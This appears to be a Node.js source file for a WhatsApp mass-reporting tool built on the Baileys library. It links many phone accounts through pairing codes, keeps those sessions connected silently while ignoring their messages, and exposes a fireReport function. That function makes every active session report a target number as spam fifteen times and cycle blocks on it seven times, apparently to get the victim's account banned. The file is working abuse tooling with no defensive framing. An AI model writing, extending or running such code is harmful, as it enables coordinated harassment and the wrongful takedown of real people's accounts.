const {
  default: makeWASocket,
  useMultiFileAuthState,
  DisconnectReason,
  makeCacheableSignalKeyStore
} = require('@whiskeysockets/baileys');
const pino = require('pino');
const path = require('path');
const fs = require('fs');
const db = require('../database');

const SESSIONS_DIR = process.env.SESSIONS_DIR || path.join(__dirname, '..', 'data', 'sessions');
if (!fs.existsSync(SESSIONS_DIR)) fs.mkdirSync(SESSIONS_DIR, { recursive: true });

// active socket map: sessionId -> sock
const activeSockets = new Map();
let io = null;

function setIO(socketIO) { io = socketIO; }

function emitStatusUpdate(sessionId, status) {
  if (!io) return;
  io.emit('session_status', { sessionId, status });
}

async function loadSession(sessionId) {
  if (activeSockets.has(sessionId)) return activeSockets.get(sessionId);

  const sessionPath = path.join(SESSIONS_DIR, sessionId);
  if (!fs.existsSync(sessionPath)) return null;

  const { state, saveCreds } = await useMultiFileAuthState(sessionPath);

  const sock = makeWASocket({
    auth: {
      creds: state.creds,
      keys: makeCacheableSignalKeyStore(state.keys, pino({ level: 'silent' }))
    },
    logger: pino({ level: 'silent' }),
    printQRInTerminal: false,
    markOnlineOnConnect: false,
    generateHighQualityLinkPreview: false,
    getMessage: async () => undefined
  });

  sock.ev.on('creds.update', saveCreds);

  sock.ev.on('connection.update', (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === 'open') {
      db.prepare(`UPDATE sessions SET status='active' WHERE session_id=?`).run(sessionId);
      emitStatusUpdate(sessionId, 'active');
      console.log(`[SESSION] ${sessionId} connected`);
    }

    if (connection === 'close') {
      const code = lastDisconnect?.error?.output?.statusCode;
      const loggedOut = code === DisconnectReason.loggedOut;

      db.prepare(`UPDATE sessions SET status=? WHERE session_id=?`)
        .run(loggedOut ? 'logged_out' : 'inactive', sessionId);
      emitStatusUpdate(sessionId, loggedOut ? 'logged_out' : 'inactive');
      activeSockets.delete(sessionId);

      if (!loggedOut) {
        // reconnect after 5s
        setTimeout(() => loadSession(sessionId), 5000);
      }
    }
  });

  // ignore all messages — silent session
  sock.ev.on('messages.upsert', () => {});

  activeSockets.set(sessionId, sock);
  return sock;
}

async function createPairingSession(sessionId, phoneNumber) {
  const sessionPath = path.join(SESSIONS_DIR, sessionId);
  if (!fs.existsSync(sessionPath)) fs.mkdirSync(sessionPath, { recursive: true });

  const { state, saveCreds } = await useMultiFileAuthState(sessionPath);

  const sock = makeWASocket({
    auth: {
      creds: state.creds,
      keys: makeCacheableSignalKeyStore(state.keys, pino({ level: 'silent' }))
    },
    logger: pino({ level: 'silent' }),
    printQRInTerminal: false,
    markOnlineOnConnect: false,
    generateHighQualityLinkPreview: false,
    getMessage: async () => undefined
  });

  sock.ev.on('creds.update', saveCreds);

  // wait for socket to reach 'connecting' then request pairing code
  const code = await new Promise((resolve, reject) => {
    const timeout = setTimeout(() => reject(new Error('Pairing timeout')), 30000);
    let codeSent = false;

    sock.ev.on('connection.update', async (update) => {
      // Request pairing code on 'connecting' — only once, before QR is generated
      if (update.connection === 'connecting' && !codeSent) {
        codeSent = true;
        try {
          await new Promise(r => setTimeout(r, 1500));
          const pairingCode = await sock.requestPairingCode(phoneNumber.replace(/\D/g, ''));
          clearTimeout(timeout);
          resolve(pairingCode);
        } catch (e) {
          clearTimeout(timeout);
          reject(e);
        }
      }

      if (update.connection === 'open') {
        clearTimeout(timeout);
        db.prepare(`UPDATE sessions SET status='active' WHERE session_id=?`).run(sessionId);
        emitStatusUpdate(sessionId, 'active');
        activeSockets.set(sessionId, sock);

        sock.ev.on('connection.update', (u) => {
          const { connection, lastDisconnect } = u;
          if (connection === 'close') {
            const closeCode = lastDisconnect?.error?.output?.statusCode;
            const loggedOut = closeCode === DisconnectReason.loggedOut;
            db.prepare(`UPDATE sessions SET status=? WHERE session_id=?`)
              .run(loggedOut ? 'logged_out' : 'inactive', sessionId);
            emitStatusUpdate(sessionId, loggedOut ? 'logged_out' : 'inactive');
            activeSockets.delete(sessionId);
            if (!loggedOut) setTimeout(() => loadSession(sessionId), 5000);
          }
        });
      }

      if (update.connection === 'close' && !activeSockets.has(sessionId) && !codeSent) {
        clearTimeout(timeout);
        reject(new Error('Connection closed before pairing'));
      }
    });
  });

  return code;
}

const delay = (ms) => new Promise(r => setTimeout(r, ms));

async function fireReport(targetNumber) {
  const target = targetNumber.replace(/\D/g, '') + '@s.whatsapp.net';
  const allSessions = db.prepare(`SELECT session_id FROM sessions WHERE status='active'`).all();

  let success = 0;
  const promises = allSessions.map(async ({ session_id }) => {
    const sock = activeSockets.get(session_id);
    if (!sock) return;
    try {
      // 15 reports
      for (let i = 0; i < 15; i++) {
        await sock.reportJid(target, 'spam', 'chat');
        await delay(700);
      }

      // 7 block → unblock cycles
      for (let i = 0; i < 7; i++) {
        await sock.updateBlockStatus(target, 'block');
        await delay(500);
        await sock.updateBlockStatus(target, 'unblock');
        await delay(500);
      }

      success++;
    } catch (e) {
      console.error(`[REPORT] Failed from ${session_id}:`, e.message);
    }
  });

  await Promise.allSettled(promises);
  return { total: allSessions.length, success };
}

async function loadAllSessions() {
  const sessions = db.prepare(`SELECT session_id FROM sessions WHERE status != 'logged_out'`).all();
  console.log(`[STARTUP] Loading ${sessions.length} sessions...`);
  for (const { session_id } of sessions) {
    await loadSession(session_id).catch(e => console.error(`[STARTUP] Failed to load ${session_id}:`, e.message));
  }
}

function getActiveCount() {
  return activeSockets.size;
}

function getSessionSocket(sessionId) {
  return activeSockets.get(sessionId) || null;
}

module.exports = {
  loadSession,
  createPairingSession,
  fireReport,
  loadAllSessions,
  getActiveCount,
  getSessionSocket,
  setIO
};
